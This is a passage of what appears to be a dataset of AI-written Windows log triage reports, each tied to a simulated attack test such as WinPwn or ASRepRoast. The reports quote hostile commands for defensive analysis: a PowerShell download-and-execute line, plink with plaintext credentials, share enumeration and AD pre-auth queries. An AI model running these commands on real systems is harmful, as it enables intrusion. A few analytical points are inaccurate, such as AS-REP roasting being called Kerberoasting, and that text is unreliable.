**SUSPICIOUS** - The logs contain activity that appears consistent with reconnaissance. Further investigation is warranted, particularly reviewing user activities and verifying the origin and justification of the executed commands:

1. **Verify User Activity:** Determine whether the user `SERVER002\admin_test` initiated the commands intentionally or if their credentials were compromised.
2. **Domain Controller Logs:** Check for corresponding logs from domain controllers that might show detailed group and user enumeration attempts.
3. **Endpoint Security:** Ensure endpoint security solutions are enabled to monitor such activities with alerting set for future occurrences, focusing on misuse of administrative tools or unexpected domain queries.

This will help corroborate or refute the possibility of lateral movement or internal reconnaissance by an unauthorized actor."
WinPwn - fruit,"**Analysis of Logs:**

**1. Application Log:**
- The application logs regarding Windows Defender indicate that it is active and running with a state of ""SECURITY_PRODUCT_STATE_ON."" This suggests that the security software is operational, which is generally positive for the security posture of the system. No suspicious activity is noted in these entries.

**2. Windows PowerShell Log:**
- The Windows PowerShell logs indicate that a PowerShell command was executed which downloads and executes a script from a raw GitHub URL. This pattern is highly suspicious, as it can be indicative of script-based malware or a remote code execution attack. The use of `iex(new-object net.webclient).downloadstring(...)` is a common approach used by attackers to fetch and run scripts. The mention of ""fruit -noninteractive -consoleoutput"" could suggest execution of an embedded command, possibly obfuscated.

**3. Sysmon Log:**
- There are multiple instances of `wevtutil.exe` and `conhost.exe` processes running. While these may be legitimate utilities when used appropriately, their presence alongside suspicious PowerShell activity raises concerns. However, they are being executed by a user named `admin_test` which might be legitimate if this user has a legitimate reason for such actions.
- Importantly, there are records showing `powershell.exe` running with command lines fetching scripts from an external URL. This mirrors the activity seen in the PowerShell logs and strengthens the suspicion.
- Execution of `hostname.exe` and `whoami.exe` appears normal individually but in the context with PowerShell may indicate reconnaissance attempts.

**4. Security Log:**
- The security logs show a successful login for the user `admin_test` using NTLM authentication from a workstation named `DESKTOP-3HL5B2P`. This shows a remote login event over a network (LogonType 3), which may be legitimate but requires verification of authenticity.
- The user `admin_test` is granted a high number of privileges including `SeDebugPrivilege`, which are typical for administrative tasks but could be dangerous if the account was compromised.

**Assessment:**
The logs exhibit suspicious behavior, particularly with the PowerShell entries that fetch external scripts and the privilege levels noted. The Sysmon and Security logs align with potential malicious reconnaissance or attack preparation steps. While the action themselves could be benign under certain conditions, without context or validation, these entries suggest elevated risk. 

**Resolution: SUSPICIOUS**
- **Threat/Risks Identified:** Potential for script-based attack using PowerShell, possible misuse of administrative privileges, remote login from an IP address internal to the network.
- **Guidance to Proceed:** 
  - **Immediate Action:** Investigate the authenticity of the user `admin_test` session: confirm the legitimacy of the remote login, and review the necessity and source of the PowerShell scripts.
  - **Respond:** Enhance monitoring around PowerShell executions and apply strict controls or restrictions on script execution. 
  - **Verify:** Check with the involved user or department if the download of scripts from GitHub aligns with expected behavior or projects.
  - **Future Mitigation:** Consider implementing stricter execution policies for PowerShell, such as Constrained Language Mode or logging enhancements to catch suspicious script executions early."
System Owner-User Discovery Using Command Prompt,"Upon a detailed analysis of the Windows event logs, here's the outcome:

### System Log:
- The logs show events related to Windows updates, specifically for Security Intelligence Update for Microsoft Defender Antivirus. This activity aligns with typical, routine update processes and is considered benign.

### Security Log:
- There are multiple events with EventID 5379 indicating failures in retrieving credentials for operations involving Microsoft account interactions. The ReturnCode 3221226021 often points to an ""Invalid Parameter"" or ""STATUS_LOGON_FAILURE"", which could mean attempts were made to access or use Microsoft account services unsuccessfully.
- However, these attempts are automated system-based background operations that occur when a machine is attempting to authenticate to Microsoft services without necessarily being indicative of malicious activity. 

### Sysmon Log:
- A variety of processes are logged such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, `net.exe`, and `net1.exe`. These are native Windows utilities and can be used for legitimate system administration tasks, as well as by attackers for discovery and lateral movement.
- Notably, `cmd.exe` was executed with command line arguments to create a temporary file and list users (`net users`) and user sessions (`query user`). This action is consistent with user or script-based system audits or inventories but doesn't necessarily spell malicious activity if there's no unusual user or exploratory context.

### Application Log:
- Indicates Windows Defender is active, which is standard for systems with Microsoft Defender Antivirus activated (`SECURITY_PRODUCT_STATE_ON`).

### Conclusion:
The logs indicate routine system maintenance and update activities. However, the combination of certain command executions could be used in malicious contexts, therefore:

- **Resolution: SUSPICIOUS**

### Guidance:
1. **Further Review**: A closer examination of user activity and interaction logs around the timestamps of the suspicious command executions is recommended to understand if a legitimate administrative task or a malicious action was performed.
2. **User Activity Monitoring**: Verify the user's intentions behind the `cmd.exe` and `net.exe` commands through interviews or task confirmations.
3. **Anomaly Detection**: Cross-reference these logs with network logs or EDR (Endpoint Detection and Response) data for any unusual access attempts or pattern of behavior indicating a threat.
4. **Alert Configuration**: Configure alerts for similar Sysmon events and monitor for repeat or escalating activity indicating potential misuse or exploitation."
List Open Egress Ports,"### Detailed Analysis of the Logs

#### Windows PowerShell Log Analysis
The Windows PowerShell logs indicate the execution of a PowerShell script aimed at checking port connectivity to a site named `allports.exposed`. The code reads a list of ports from a text file located in a temp directory, ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\top-128.txt"", and attempts to connect to them. The results are written to a file on the desktop named `open-ports.txt`.

##### Suspicious Elements:
- **Command Execution**: The script attempts connections to a potentially suspicious domain, `allports.exposed`, which could be indicative of network scanning or an attempt to map open ports.
- **Location of Files**: Using file paths within a user’s AppData Local temp folder and saving results on the desktop can be a tactic for evading detection and gaining persistence.

#### Sysmon Log Analysis
The Sysmon logs reveal the execution of several processes during the specified time frame. Significant events include PowerShell instances, command-line utilities like `wevtutil.exe`, `whoami.exe`, and `hostname.exe`, alongside `conhost.exe`.

##### Suspicious Elements:
- **Repeated Execution of Command-Line Tools**: There are multiple instances of `conhost.exe`, `wevtutil.exe`, and PowerShell. While some usage of these tools is legitimate, their occurrence alongside speculative network scanning is questionable.
- **Process Hierarchy & Execution Context**: The PowerShell script runs with high integrity level under `SERVER002\\admin_test`, indicating enough privileges to potentially cause harm if the script has malicious intent.

#### Application Log Analysis
The application log contains an entry related to the Software Protection Platform Service, which seems unrelated to any suspicious activity and is typical in ensuring system licensing compliance.

### Assessment and Resolution

Based on the provided logs, the activities observed can be characterized as follows:

- The PowerShell script's behavior, including connecting to multiple ports on a potentially dubious server, `allports.exposed`, raises concerns. This behavior fits the pattern of reconnaissance, which is often a precursor to more serious attacks.
- The frequent use of command-line utilities in quick succession, especially under privileged execution contexts, supports the potential for an attempted compromise or system exploration.
- Although there is no direct indication of data exfiltration or distinct malicious activities, the combination of scripts and administrative tools usage is flagged as questionable.

### Conclusion: SUSPICIOUS

Given these observations, the resolution is marked as **SUSPICIOUS**. The activity noted could indicate an initial exploration phase, warranting further investigation. An analyst should:
- Analyze the domain `allports.exposed` to determine its legitimacy.
- Investigate the origin and intent of the PowerShell script and verify if it aligns with any known threats or permitted operations.
- Check for any correlated events or indicators of compromise within broader network monitoring tools.

Based on further investigation outcomes, review internal network traffic associated with `Server002` for unexpected patterns or connections and perform a full security audit of accounts associated with `admin_test`."
ESXi - Darkside system information discovery,"### Detailed Analysis of Logs

Upon reviewing the provided Windows event logs, several key observations and potential areas of concern have been identified:

#### Sysmon Logs
1. **Process Execution Events (EventID: 1)**:
   - Multiple instances of standard Windows processes were noted, such as PowerShell, conhost.exe, wevtutil.exe, and cmd.exe. However, the execution of `cmd.exe` stands out because it involves the use of `plink.exe` for SSH connections:
     - **Command Line Execution**: The command line for `cmd.exe` includes an invocation of `plink.exe` with credentials to connect to a remote server using SSH, which is unusual for a typical administrative task. This strongly suggests an unauthorized or potentially malicious remote connection attempt:
       ```
       ""cmd.exe"" /c echo """" | ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\plink.exe"" ""file.local"" -ssh  -l ""root"" -pw ""pass"" -m ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\src\esx_darkside_discovery.txt""
       ```
     - The presence of plaintext credentials within the command line is a clear security issue.

2. **Service-Related Activities**:
   - Several activities related to Windows services, including EdgeUpdate and system services like wevtutil, appear benign as they relate to regular operations such as system updates.

#### Security Logs
- **Logon Events**: These seemed normal with standard user `SYSTEM` logons and privilege assignments.
- **Privilege Assignments (EventID: 4672)**: The SYSTEM account was granted high-level privileges. This is expected but should be monitored for misuse, especially if involved with unusual process launches.

#### Application Logs
- Mostly benign with service stop/start notifications, especially related to EdgeUpdate.

### Assessment
- The primary concern highlighted by the logs is the use of `plink.exe` to attempt a connection to an external server using explicit credentials. This is atypical and warrants further investigation.

### Conclusion
The presence of command-line activity involving sensitive credentials and remote connectivity using `plink.exe` constitutes a clear security risk that could indicate an attempt at unauthorized access or data exfiltration.

### Final Resolution
**MALICIOUS**: The evidence of attempted unauthorized remote connectivity with plaintext credentials indicates malicious activity.

### Guidance
- **Immediate Actions**:
  - **Isolate the Host**: Disconnect the affected host from the network to prevent further unauthorized access or data leakage.
  - **Change Credentials**: Immediately change all potentially compromised credentials, especially those directly involved in the `plink.exe` command.
  - **Conduct a Thorough Investigation**: Review other logs and network activity around the time of the incident to uncover any further malicious activities.
  - **Malware Scan**: Initiate a comprehensive malware scan on the affected system to detect any installed threats.

- **Preventive Measures**:
  - **Restrict Remote Tools**: Disable or closely monitor tools like `plink.exe` within the organization to prevent unauthorized usage.
  - **Implement Credential Security**: Ensure credentials are not stored or transmitted in plaintext. Use more secure methods like environment variables or encrypted files.
  - **Audit Privileges**: Regularly audit user privileges and watch for any anomalies in privilege assignments, particularly for high-privilege accounts.

Ensure all findings and actions are documented thoroughly to aid future investigations and improve security posture."
PowerShell Network Sniffing,"After thoroughly analyzing the provided Windows event logs, here's a detailed breakdown of the observations:

1. **Usage of PowerShell and Packet Capture Commands:**
   - The key point of interest is the execution of `PowerShell` with commands related to network packet capture:
     ```
     CommandLine: ""powershell.exe"" & {New-NetEventSession -Name Capture007 -LocalFilePath \""$ENV:Temp\\sniff.etl\""
     Add-NetEventPacketCaptureProvider -SessionName Capture007 -TruncationLength 100
     Start-NetEventSession -Name Capture007
     Stop-NetEventSession -Name Capture007
     Remove-NetEventSession -Name Capture007}
     ```
   - This indicates that a network packet capture session was created and executed. While such actions can be legitimate for network diagnostics, they are also commonly associated with unauthorized monitoring.

2. **Process Execution Pattern:**
   - The frequent execution of `wevtutil.exe` and `conhost.exe` processes under the user `SERVER002\\admin_test` at very close intervals could indicate scripting or automation. However, there is no inherently malicious process or unusual command invocation observed here.

3. **High Integrity Level and Privileged User Account:**
   - The commands were executed under a high integrity level, and the account `admin_test` has extensive privileges (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.). This is standard for administrative tasks but requires scrutiny if the behavior seems unusual for the account's typical actions.

4. **Time Anomaly:**
   - There is an anomaly related to time stamps indicating a possible system time change occurring:
     ```
     Event ID 4616 (Security): The system time was changed.
     ```
   - This could be part of normal time synchronization operations but also aligns with attempts to manipulate logs/timestamps for evasion purposes.

5. **Security Context and Logon Types:**
   - The use of NTLM authentication (`LogonType` 3 indicates a network logon) doesn’t highlight any abnormal behavior by itself without further context on the typical network activities.

6. **Executed Commands (whoami, hostname):**
   - Commands like `whoami.exe` and `hostname.exe` are benign if run for informational purposes. They are commonly used in scripts or admin tasks.

**Assessment and Conclusion:**

- **SUSPICIOUS:** The suspicious command involving packet capture warrants further investigation due to potential unauthorized use. Network packet capturing without explicit administrative consent could indicate reconnaissance activities by a potential insider threat or malicious actor with elevated privileges. The time change events raise additional questions about potential tampering with the system clock for log evasion strategies.

**Recommended Next Steps:**
1. **Review User Activity:** Investigate the activities and patterns associated with the `admin_test` account, especially its typical use case and any deviations.
2. **Network Monitoring:** Check for the existence and contents of the captured packets in the specified file path to assess potential data exfiltration.
3. **Verify Time Settings and Changes:** Ensure that time synchronization settings are configured correctly and look for any unauthorized changes in the system time history.
4. **Enhance Logging and Monitoring:** Implement or review additional security controls and logs, especially for PowerShell and network-related activities.

This assessment suggests that while no overtly malicious actions are evident, certain activities could potentially align with preparatory steps for a more significant compromise, hence further scrutiny is advised."
Find and Display Internet Explorer Browser Version,"### Detailed Analysis:

#### Sysmon Log Analysis:
1. **Repeated Process Executions:**
   - We observe frequent execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test` in quick succession.
   - **Suspicion:** While the processes themselves are legitimate Windows components, the repetitive and rapid executions, particularly of `wevtutil.exe`, which is used to manage event logs, are unusual and merit further investigation.

2. **Execution of Command-Line Tools:**
   - The tool `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe` with certain command-line arguments were executed.
   - `cmd.exe` executed a `reg query` command with no evident malicious intent but could be part of an exploratory action by an attacker or an admin's task.

3. **WmiPrvSE.exe Execution:**
   - Execution of `WmiPrvSE.exe` by `NT AUTHORITY\SYSTEM`, a legitimate Windows process related to WMI (Windows Management Instrumentation).
   - **Contextual Suspicion:** If combined with other suspicious activities, it may indicate an attack vector, though on its own in this log, it may not raise immediate flags.

4. **Network Time Change Events:**
   - Time adjustments involving `svchost.exe` could be normal in contexts like Daylight Saving changes but if manipulated improperly, could be indicators of malicious tampering.

#### System Log:
- The logs indicate time changes on `Server002`, with `svchost.exe` processes on a service level (`LOCAL SERVICE`).
- **Suspicion:** While time change events (`EventID: 1` and `EventID: 24`) are not inherently malicious, they coincide with the unusual execution of `wevtutil.exe`, which could point to either legitimate maintenance or cover-up attempts for other activities.

#### Security Log:
- **Time Change Auditing (EventID 4616):** Confirmed time changes corresponds with the security auditing events.
- **Concern:** Synchronization with organizational time servers should be checked, given the manipulation context.

### Assessment:
- **Suspicious Activity Detection:** The activities noted, such as frequent execution of potentially sensitive processes (`wevtutil.exe`) and the rapid succession of commands, indicate **anomalous behavior**. These may either be part of legitimate administrative tasks or indicate malicious probing or log manipulation.
  
- **Need for further investigation:** To confirm if this is valid maintenance or an oversight in administrative actions, or if it indeed signifies an attempt to cover tracks or escalate privileges.

### Resolution:
The logs indicate **SUSPICIOUS** activity that warrants deeper investigation, particularly verifying:
- The intent and context of the user `SERVER002\admin_test` during these executions.
- Scheduled tasks or administrative scripts that could explain the rapid process creations.
- Correlation with other logs or alerts that may provide a clearer context.
- Any deviation from normal system or user behavior patterns.

### Guidance:
- **Immediate actions:** Verify if similar patterns occur across other servers or relevant systems.
- **Collaborate with IT:** Confirm with the user or IT if these are part of scheduled tasks or routine maintenance.
- **Monitor in Real-time:** Set up alerts for similar activities to catch potential misuse early."
System Time with Windows time Command,"Upon reviewing the provided logs from multiple sources such as Security, System, Sysmon, and Application logs, I made the following observations and analysis:

### Detailed Analysis:

1. **Privilege Escalation - Event ID 4672:**
   - A privileged logon session was granted to a user `admin_test` on `SERVER002`, as seen in the Security Event ID 4672. The privileges involved include SeDebugPrivilege, SeLoadDriverPrivilege, and more, some of which are commonly seen in administrative tasks. While having these privileges is normal for administrative accounts, any unauthorized use of these privileges could be a security risk. This alone does not indicate malicious activity, but it warrants caution and context assessment.

2. **Unusual Tool Usage - Command Line Tools:**
   - The use of command-line tools like `wevtutil.exe`, `whoami.exe`, `cmd.exe`, and `hostname.exe` by the user `admin_test` from the Sysmon logs may suggest activity for log manipulation, user identity verification, and command execution, respectively. While execution in itself is not definitive of malicious intent, it can be part of reconnaissance actions if done repeatedly or out of expected context.

3. **Logon Event - Event ID 4624:**
   - The logon event using NTLM with Logon Type 3 (a network logon) indicates a legitimate remote logon session onto `SERVER002` by the user `admin_test`. The IP address provided (fe80::e3b5:5371:12a8:9c77) points towards an IPv6 local network address, which appears typical.

4. **Time Change Events - Event ID 4616:**
   - There are multiple instances of the system time being changed by `svchost.exe`. While this can be part of a service time synchronization, frequent unexpected time changes can be associated with attempts to manipulate time-based security controls or logs. In this context, they appear concurrent with other benign system events.

5. **Software Update Activities:**
   - There is extensive activity related to Microsoft Edge Updates, captured in the Sysmon logs. These events describe installation and execution of update-related processes such as `MicrosoftEdgeUpdate.exe` and `setup.exe`. All actions are performed by the `NT AUTHORITY\SYSTEM`, indicating they are likely automated system processes handling legitimate software updates.

### Assessment:

- **Suspicious Activity:**
  - There is repeated use of command-line utilities like `wevtutil.exe` and `cmd.exe` by `admin_test`. While it may not be strictly malicious, it could indicate suspicious behavior warranting further scrutiny, especially if these actions were unexpected or unauthorized for this user.
  - Time manipulation events should be clarified with appropriate context, especially if they coincide with attempts to tamper or alter logging.

### Conclusion: SUSPICIOUS

Given the presence of high-level privileges, the use of system utilities typically associated with reconnaissance, and peculiar time change events by `svchost.exe`, I would classify the activity as **SUSPICIOUS**. This outcome does not necessarily signify malicious intent but suggests that the actions require further investigation to ensure there is no underlying security concern.

### Guidance:

1. **Verification of User Actions:**
   - Validate if the activities of `admin_test` align with their usual administrative tasks. An activity log related to their authorized actions might provide needed context.

2. **Correlate with Known Changes:**
   - Confirm any legitimate changes or updates on the system during this period, which might explain both software update logs and command-line utility usage.

3. **Monitor Logons and Privilege Usage:**
   - Continue to monitor accounts with high privilege logons, mainly if accessed remotely, for any further signs of misuse.

4. **Review System Time Changes:**
   - Coordinate with IT to verify if the time alterations had a legitimate cause connected to system maintenance or a scheduling error. 

Careful review and context clarification of these observations will ensure confidence in determining whether the actions were benign or necessitate further action."
Network Share Discovery via dir command,"In the provided event logs, several entries indicated routine system processes and operations associated with Microsoft Edge updates, which is common and expected behavior. All these processes are signed by Microsoft Corporation, suggesting their legitimacy. However, one log entry raises some concerns due to its command-line usage and context, which requires closer examination:

### Analysis: 
1. **MicrosoftEdgeUpdate.exe Activity:**
   - The logs contain numerous instances of `MicrosoftEdgeUpdate.exe`. This is a legitimate process associated with updating the Microsoft Edge browser. The frequent execution of this process can be attributed to scheduled updates or maintenance checks, which are standard operations for managed systems ensuring browsers remain up-to-date for security and performance reasons.

2. **Command Execution from cmd.exe:**
   - The log entry showing usage of `cmd.exe` with the command line:
     ```
     ""cmd.exe"" /c dir \\127.0.0.1\c$ & dir \\127.0.0.1\admin$ & dir \\127.0.0.1\IPC$
     ```
     - **Interpretation**: This command enumerates directory contents for administrative shares (c$, admin$, IPC$) on the local host (`127.0.0.1`). While this command itself is not inherently malicious, it poses questions given it might be used in lateral movement, reconnaissance activities, or attempts to access sensitive directories.
     - **User Context**: It is important to note that the `admin_test` user executed this command with high integrity, suggesting administrative privileges were used.
   
3. **Frequent Use of `whoami.exe` and `hostname.exe`:**
   - Multiple executions of utilities like `whoami.exe` and `hostname.exe` might not be particularly suspicious if they are run by system management scripts or during logging sessions. These commands are often used to ascertain the domain user and machine name.

4. **`wevtutil.exe` Usage:**
   - `wevtutil.exe` is a tool to retrieve information about event logs and publishers. There are repeated invocations of this process by the user `admin_test`, but without accompanying context, these instances might be correlated with system diagnostics or log maintenance tasks.

### Assessment & Recommendation:
- **Assessment**: The presence of repeated accesses to administrative shares using `cmd.exe` warrants further investigation due to its potential misuse in malicious scenarios. While it does not definitively indicate malicious activity on its own, without context or a known, legitimate purpose, it is a common technique observed in privilege escalation and internal reconnaissance.
- **Recommendation**: 
  - Verify if the user `admin_test` was performing known administrative tasks during this period or if there are automated scripts scheduled to run similar commands.
  - Cross-reference these events with network traffic logs or antivirus logs if applicable to verify if there are indicators of data exfiltration or unauthorized access attempts.
  - Ensure logging and monitoring are configured to alert on unusual command-line patterns, especially involving administrative shares or wide access permissions within the network.

### Resolution:
- Given the potential risk observed from the `cmd.exe` execution, I categorize the activity as **SUSPICIOUS**. Investigate the purpose of these commands further to determine if follow-up action is necessary."
WinPwn - shareenumeration,"### Detailed Analysis

#### Indicators of Malicious Activity
1. **PowerShell Activity:**
   - Multiple PowerShell events indicate the execution of potentially suspicious scripts directly from the web using `invoke-expression` (`iex`) and `net.webclient`. Specifically, this command downloads and executes a script from a GitHub URL:
     ```
     iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1')
     ```
     - This activity is commonly associated with attempts to download and execute scripts which could lead to further exploitation or unauthorized activities.
   - This pattern of behavior often suggests potential exploitation activities or unauthorized system modifications, often part of malware delivery tactics.

2. **Frequent Edge Update Executions:**
   - The log records numerous instances of the `MicrosoftEdgeUpdate.exe` process being executed. While Edge updates themselves are legitimate, the frequency, pattern, and surrounding contexts could indicate misuse or abuse. Such a prevalence of temporary directories like `Temp\\EUFB2F.tmp` is unusual in rapid succession.
   
#### Suspicious or Anomalous Behavior
1. **Time-setting Logs:**
   - The logs show repeated events of the time being set or adjusted on the system. While time adjustments alone aren't inherently malicious, frequent adjustments by `svchost.exe` within a short period could suggest potential efforts to disguise activities or logs by altering system time references.

2. **Execution of System Utilities:**
   - Tools like `whoami.exe` and `wevtutil.exe` have been executed by the `admin_test` user. Although these tools are legitimate, their utilization outside standard administrative tasks might suggest an attempt to query user information and manipulate or clear event logs, respectively.

3. **Windows Defender Updates:**
   - Several updates for Windows Defender are logged, indicating that the antivirus is active and receiving updates. This could be indicative of potential defensive measures in place; however, overly frequent updates might also be concerning if used to deflect from unauthorized configurations.

4. **Sysmon Logs:**
   - There are numerous `Sysmon` events capturing process creations and file hashes which appear legitimate, but any unusual pairing with suspect activities needs attention.

### Assessment
- **Activity Pattern:** The combination of PowerShell usage, temporal administrators, and repetitive execution of `MicrosoftEdgeUpdate.exe` components establishes a pattern that needs further investigation.
- **Potential Threats:** The principal concern here is the handling of PowerShell scripts from external, unreliable sources which have a substantial risk of leading to malware execution or further system compromise.

### Resolution and Guidance
- **Resolution: MALICIOUS**
  - The direct execution of PowerShell scripts from external URLs without validation is a strong indicator of malicious intent.
- **Recommended Actions:**
  1. **Immediate Investigation:** Ensure that the scripts downloaded are analyzed independently to understand their intent and any resultant changes they may have executed on the system.
  2. **Endpoint Security:** Enhance endpoint protection to block similar script executions in the future, setting restrictions on PowerShell usage and web file downloads.
  3. **Review Privileged Accounts:** Audit the `admin_test` user account and other users with similar access for any unauthorized credentials or actions.
  4. **Network Segmentation:** Review network traffic logs around the event times for any unexpected connections or data flows.
  5. **Restore System Integrity:** If scripts or executables are confirmed malicious, assess the extent of the breach and consider restoring from known good backups following initial containment.

By following these guidelines, the system's security posture can be assessed and strengthened to prevent future incidents."
Enumerate Users Not Requiring Pre Auth (ASRepRoast),"Upon examining the provided Windows event logs, we focus on the Sysmon and PowerShell logs to identify any suspicious activities or signs of potential compromise. Here is a detailed analysis of the log entries provided:

### Analysis of Logs:

#### Sysmon Log Events:
1. **Repeated PowerShell and Wevtutil Executions:**
   - Multiple instances of `powershell.exe` being executed by the user `SERVER002\admin_test` are captured, particularly around the same timestamp (13:21:39 - 13:21:42). Notably, the command executed (`get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}`) is known to be used in reconnaissance activities to list user accounts in Active Directory that have the property `DoesNotRequirePreAuth` set to true. This activity is typical of an attacker looking for accounts vulnerable to Kerberoasting, which is a known tactic for credential theft.
   - The process `wevtutil.exe` is also executed multiple times by the same user `SERVER002\admin_test` with a command to export logs (epl command). This could suggest log tampering or exfiltration of logs.

2. **Use of whoami and hostname:**
   - The execution of `whoami.exe` and `hostname.exe` can be viewed as benign, but in context and combined with other unusual activities (such as running the PowerShell script mentioned), it might suggest an adversary trying to understand the environment they are in.

#### PowerShell Log Events:
1. **Suspicious Command Execution:**
   - PowerShell logs also capture the `get-aduser` command, affirming the Sysmon logs. The execution of this command in the context of Active Directory user enumeration raises a red flag about potential reconnaissance or enumeration activities.

2. **High Integrity Level and SYSTEM32 Usage:**
   - The commands run with high integrity levels and system tools (inside `C:\Windows\System32\`) indicate the user running these commands may have elevated privileges, often a target for attackers post initial compromise.

### Conclusion:

Based on the above analysis and correlation between the suspicious PowerShell script execution and the timeline of activity involving both PowerShell and Wevtutil, it is reasonable to suspect malicious intent:

- **Suspicious PowerShell Activity:** The PowerShell command `get-aduser -f * -pr DoesNotRequirePreAuth` indicates probing for user accounts vulnerable to specific attacks.
- **Log Manipulation or Exfiltration:** The `wevtutil epl` command suggests that an attempt was made to manage or possibly exfiltrate event logs, potentially to cover up tracks or analyze logs off-system.

### Resolution:
**SUSPICIOUS** - The activities surrounding the use of PowerShell to enumerate Active Directory users alongside the frequent `wevtutil.exe` execution warrant a deeper investigation. While there is no absolute proof of compromise, the behavior is consistent with preparatory steps of an attack or exploration of the environment post-compromise. Further steps should include:

- Conducting a thorough review of user `admin_test` logins and activities during this period.
- Checking the integrity and completeness of logs.
- Reviewing network traffic logs for unusual data exfiltration patterns.
- Investigating potential unauthorized access to Active Directory.

Proceed with increased monitoring and possibly isolate the system for detailed forensic analysis."
List Internet Explorer Bookmarks using the command prompt,"Upon analyzing the provided Windows event logs, several activities can be observed. Let's break down the findings:

### Key Observations:
1. **Time Synchronization:**
   - Multiple entries in the System log indicate time changes managed by `svchost.exe`, tied to the Windows Time Service. This can be a routine system operation, adjusting the system clock via time.windows.com.

2. **Service and Process Execution:**
   - Observations in the System and Application logs show routine activity such as time synchronization and service stoppage.
   - PowerShell logs are missing, which means there’s no suspicious scripting activity recorded through PowerShell.

3. **Processes and Commands Observed in Sysmon Logs:**
   - Execution of standard Windows utilities like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe` is logged.
   - Command `cmd.exe /c dir /s /b %USERPROFILE%\Favorites` is noted, which can be non-malicious if executed by system scripts or benign administrative tasks.
   - The execution of `MicrosoftEdgeUpdate.exe` throughout the Sysmon logs appears consistent with normal updating of Microsoft Edge.

### Analysis:
- **Time Changes:**
  - Time adjustments through `svchost.exe` are normal within the context of synchronized time settings.
  
- **Service Stoppings:**
  - Entries ""Service stopped"" under `edgeupdate` in the Application logs seem benign, corresponding with an update process for Microsoft Edge.

- **Sysmon Logs:**
  - The sequence of commands showing execution of system utilities like `hostname`, `whoami`, and `cmd` doesn’t immediately suggest malicious activity. However, checking for context or historical user behavior may further clarify intent.
  - Exploiting system utilities (LOLBins like `cmd` or `whoami`) is common in attacks, but the absence of anomalous behaviors suggests these are being used for legitimate purposes in these entries.

- **Microsoft Edge Update:**
  - Multiple entries related to `Microsoft Edge Update` seem to be automatic updates executed under the `NT AUTHORITY\SYSTEM`, aligning with legitimate software maintenance activities. 

### Recommendations:
- Review historical logs for any precedent behavior aligned with these commands to ensure consistency with past legitimate activity.
- Verify that the processes tied to `MicrosoftEdgeUpdate.exe` executed across different directories are expected per the organization’s update policies.
  
### Conclusion:
- **Resolution: BENIGN**
  - Based on the provided logs, no clear evidence of malicious activity is observed. The entries align with routine system operations and legitimate software updates. However, continuous monitoring and correlation with user behavior or anomalies over time are advised to ensure no subtle threats are overlooked."
TruffleSnout - Listing AD Infrastructure,"## Detailed Analysis of Windows Event Logs

### Overview
The provided log entries comprise data from various logs, including Application logs, Sysmon logs, and a lack of activity in Security, Windows PowerShell, and System logs. The focus is therefore on Sysmon and Application logs. The key task is to identify any suspicious behavior, indicating compromise or requiring further investigation.

### Application Log Analysis
1. **Windows Defender State**:
   - Multiple entries showing Windows Defender in `SECURITY_PRODUCT_STATE_ON`. This indicates that Windows Defender is active and functioning properly.
   - This is considered benign behavior and suggests that the system has active threat protection.

2. **Software Protection Platform Service**:
   - Event regarding the Software Protection Platform Service doesn’t reflect abnormal behavior. It is standard for Windows features to log such events for license and software integrity checks.
   - The application logging here does not indicate any suspicion.

### Sysmon Log Analysis
1. **Process Creation Events (EventID: 1)**:
   - **Processes Notable for Inspection**:
     - `powershell.exe`: Detected but without specific malicious command-line details. Execution of PowerShell is common, particularly by administrative users. However, it can also be exploited, requiring context or abnormal patterns for suspicion.
     - `wevtutil.exe`: This utility can be used to manipulate event logs (like clearing or archiving) which is suspicious, given no log-clearance intent should be standard.
     - `cmd.exe -> TruffleSnout.exe`: High Integrity Level Cmd execution running an unusual executable from a temporary directory is alarming. The `TruffleSnout.exe` execution indicates possible penetration testing tools or malicious intent if not authorized.
     - `whoami.exe`, `HOSTNAME.EXE`, `conhost.exe`: Execution of these could be benign, used for simple user info and environment details. Standard in command-line operations, but when chained with suspicious activity, it suggests potential reconnaissance.

2. **Process Termination Events (EventID: 5)**:
   - Numerous processes associated with common Windows commands (like `wevtutil.exe` and `conhost.exe`) are logged, largely executed by the `admin_test` user.
   - Frequent appearance and rapid succession of conhost associated with other operations are worth scrutiny but are not inherently malicious if explained by regular administrative scripts.

### Conclusion
- The appearance of `TruffleSnout.exe`, especially executed from a temporary file location with what appear to be potential AD reconnaissance options (""forest"" and ""domain""), rings alarm bells. This indicates potential credential dumping or directory enumeration that typical users wouldn't perform without clear justification.
- Regular administrative scripts could explain some behavior, but the combination with TruffleSnout and possible obfuscation techniques (folder traversal in the command) heightens the need for closer inspection.

### Assessment
- **Resolution**: **SUSPICIOUS**
  - Justification: Potential misuse of tools like `TruffleSnout` paired with directory and network domain operations requires further investigation. While execution of benign commands exists in logs, the comprehensive context is suggestively unconventional.
  
### Recommended Actions
1. **Investigate User Activity**:
   - Confirm the legitimacy of `admin_test` actions. Was this user authorized for all the activities reported?
   
2. **Validate TruffleSnout Execution**:
   - Determine if `TruffleSnout.exe` is an approved tool within context or assess for unauthorized/exploitative use.

3. **Review System for Indicators of Compromise (IoCs)**:
   - Conduct scan for known malicious signatures censorsing TruffleSnout and other abnormalities in processes.
   
4. **Audit Administrative Tools and Scripts**:
   - Ensure the invocation of administrative scripts (including PowerShell and command executions) is consistent with operational practices.

5. **Consider Implementing Monitoring Alerts**:
   - Set thresholds and alerts for the recurring execution of suspicious binaries and changes to security logs. 

### Final Notes
Treat this assessment with urgency, involving relevant IT and security teams to validate the extent of any intrusion before deeming the host as potentially compromised and taking mitigative action."
Query Registry with Powershell cmdlets,"Based on the logs provided, I have conducted a thorough analysis and have identified the following points of interest:

### Application Log:
- **EventID 15:** Indicates that Windows Defender is in an active state (""SECURITY_PRODUCT_STATE_ON""). This is expected behavior and does not indicate any suspicious activity.

### Windows PowerShell Log:
